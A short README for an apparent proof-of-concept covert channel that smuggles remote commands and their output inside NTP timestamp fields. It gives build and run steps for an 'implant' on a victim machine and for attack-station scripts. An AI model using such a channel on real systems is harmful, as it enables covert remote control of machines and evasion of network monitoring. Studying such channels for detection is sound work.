# Code Overview
This Repository contains a simple Covert channel that gives users the ability to send packets to and from an attack station and a victim station over NTP.
This code not really designed for actual use, more of a proof of concept that allows us to issue commands to a terminal and get a response.
When testing with two machines on the same LAN, we have yet to lose a single packet from UDP.
The limit of one message is 32 KB.


Each packet of information is stored in 4 bytes, in the fraction portion of the transmit timestamp. The rationale for this is that both senders and receivers of this traffic update this portion of the packet. Two flags and a sequence number is stored in the source port on the victim, and in the receive timestamp on the attack station.



# HOW TO USE:

1. Compile C code on target machine (Code is designed for linux)
    - ```gcc implant.c -o implant```
2. Ensure Python is installed and install NTP python library on Attack Station
    - ```pip install ntplib```
3. Run both python scripts in separate terminals on Attack Station
    - ```sudo python3 attackbox.py```
    - ```sudo python3 server.py```
4. Run C Code on target machine
    - ```./implant <timeInterval(s)> <Target IP> <Attack IP>```
5. Once you receive "Type your message" on attackbox terminal, input your desired command in and press enter
6. Receive output on server terminal
7. Be Happy :) <--- He has lipstic on VSCode